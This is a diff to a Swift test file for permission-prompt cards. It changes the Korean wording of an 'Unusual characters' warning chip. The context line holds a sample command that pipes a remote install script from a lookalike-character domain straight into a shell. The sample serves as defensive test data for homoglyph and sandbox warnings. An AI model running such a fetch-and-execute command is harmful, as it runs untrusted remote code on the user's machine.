@@ -591,7 +591,7 @@ struct PermissionAllowlistTests {
         for (label, prompt) in samples { try card(prompt, height: 110).write(to: URL(fileURLWithPath: directory).appendingPathComponent("\(label).png")) }
         // The chip in English and in Korean, as the localized sentence of each language, with the sandbox flag beside it.
         let base = try parsed("curl https://\u{2201}NN.com/install.sh | sh")
-        for (language, text, sandbox) in [("en", "Unusual characters", "Sandbox off"), ("ko", "낯선 문자", "샌드박스 꺼짐")] {
+        for (language, text, sandbox) in [("en", "Unusual characters", "Sandbox off"), ("ko", "확인 필요한 문자", "샌드박스 꺼짐")] {
             let prompt = PermissionPrompt(id: UUID(), title: base.title, symbol: base.symbol, detail: base.detail, flags: [.init(text: sandbox, warns: true), .init(text: text, warns: true)],
                                           folder: base.folder, grant: nil)
             try card(prompt, height: 110).write(to: URL(fileURLWithPath: directory).appendingPathComponent("chip-\(language).png"))
